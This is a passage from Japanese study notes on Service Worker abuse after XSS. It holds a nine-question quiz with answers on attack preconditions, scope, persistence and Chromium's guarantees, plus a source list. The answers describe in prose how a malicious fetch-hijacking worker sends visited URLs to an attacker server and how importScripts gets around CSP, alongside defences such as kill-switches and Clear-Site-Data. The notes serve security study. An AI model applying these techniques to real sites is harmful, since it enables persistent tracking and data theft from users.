- push通知許可が無ければSWはイベントを受け取れず、後日開発された攻撃をトリガーできない（明示的許可が鍵）。
- サードパーティiframeのSWはトップレベルサイトでパーティション化され、クロスサイト共有・追跡はできない。
- VRP報奨対象は、over-long lifetime、same-origin bypass、無許可の権限アクセス（Geolocation / センサ / マイク・カメラ / USB・Bluetooth）などの表明破り。

## 理解度チェック

1. XSSが1つ見つかれば、それだけで悪性SWを登録できるか。できないなら何が追加で必要か。
   ▶ 答え：できない。SWは「同一オリジンから正しいJavaScript MIME type で配信されたスクリプトURL」でしか登録できないため、任意JSアップロード、JSONP callback反射、DOM Clobbering など「そのオリジンから任意のJS本文を返せる」追加の足がかりが必要。

2. `fetch` 乗っ取りSWの `mode: "no-cors"` は何のためにあるか。
   ▶ 答え：被害者がアクセスした各URLを攻撃者サーバへクロスオリジン送信する際、CORSエラーを回避するため。レスポンスは読めないが送信自体は成立する。

3. `importScripts` が「CSPを回避する」と言われるのはなぜか。
   ▶ 答え：ページの `<script>` に効くCSP（`script-src`）はワーカー内の `importScripts` を直接制限しないため。SWに効くCSPはSWスクリプト応答の `Content-Security-Policy` レスポンスヘッダで別途指定しないと、引数汚染で任意オリジンのスクリプトを読み込める。

4. SWスクリプトを `/uploaded/sw.js` に置いた場合、`{scope: '/'}` で登録するには何が必要か。
   ▶ 答え：SWスクリプト応答に `Service-Worker-Allowed: /` レスポンスヘッダを付ける必要がある。無いと既定最大 scope は `/uploaded/` に制限される。

5. XSSで登録された悪性SWは、XSS修正後どれくらい残存しうるか（Chromiumの保証）。
   ▶ 答え：クライアントがオンラインである前提で、24時間のキャッシュ指令上限により最大24時間に保証される。ただし更新スクリプトが activate されるまで古いワーカーは残りうるため、確実な除去には kill-switch や `Clear-Site-Data` が必要。

6. 攻撃者がJPEG画像をアップロードしてSWとして登録することはできるか。
   ▶ 答え：できない。SW仕様・実装はSWスクリプトが正しいJavaScript MIME type（`text/javascript` 等）を持つことを要求するため、`image/jpeg` で返るファイルは登録できない。

7. サードパーティiframeが登録したSWでクロスサイト追跡ができない理由は。
   ▶ 答え：サードパーティiframeのSWは、そのオリジンに加えてトップレベルサイトでパーティション化されるため。`a.com` 内と `b.com` 内の同じサードパーティのSWは別パーティションに分離される。

8. ChromeのVRPで報奨対象になりうるSWのセキュリティ表明破りを2つ挙げよ。
   ▶ 答え：over-long registration/lifetime（着信イベント無しに生存し続けるSW）、same-origin bypass / off-origin登録、許可なしの権限アクセス（Geolocation、ハードウェアセンサ、マイク・カメラ、USB・Bluetooth）のうち2つ。

9. 運営者がSW配信を意図しないパスでできる防御は何か。
   ▶ 答え：リクエストの `Service-Worker` ヘッダをチェックし、SWスクリプトのリクエストを `400 Bad Request` 等で明示的に拒否する。

## 出典

- HackTricks「Abusing Service Workers」 — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers （原本: https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md ）
- Chromium「Service Worker Security FAQ」 — https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md （ミラー原本: https://github.com/chromium/chromium/blob/main/docs/security/service-worker-security-faq.md ）
- Hijacking service workers via DOM Clobbering — https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering
- developers.google.com - Primers - Service Workers — https://developers.google.com/web/fundamentals/primers/service-workers
- Chrome DevTools - Application panel overview — https://developer.chrome.com/docs/devtools/application
- Shadow Workers — https://shadow-workers.github.io
- MDN - ServiceWorkerRegistration.update() — https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/update
- Service-worker kill-switch pattern — https://stackoverflow.com/a/38980776
- Clear-Site-Data — https://www.w3.org/TR/clear-site-data/

<!-- sources: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers, https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md, https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering, https://shadow-workers.github.io, https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/update, https://stackoverflow.com/a/38980776, https://www.w3.org/TR/clear-site-data/ -->
<!-- terms: Service Worker, fetch イベント, importScripts, DOM Clobbering, JSONP, scope, Service-Worker-Allowed, Service-Worker ヘッダ, セキュアコンテキスト, Same-Origin Policy, Cache API, Clear-Site-Data, kill-switch SW, Shadow Workers, Site Isolation, Payment Handler, プッシュ通知, VRP, ストレージパーティショニング, foreign fetch -->

<!-- self-read: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers | サイト側の egress 制限で 403。原本Markdownは取得済みだが読者は公式GitHub原本で確認できる -->
<!-- self-read: https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md | サイト側の egress 制限で 403。原本Markdownは取得済みだが読者は公式GitHubミラーで確認できる -->
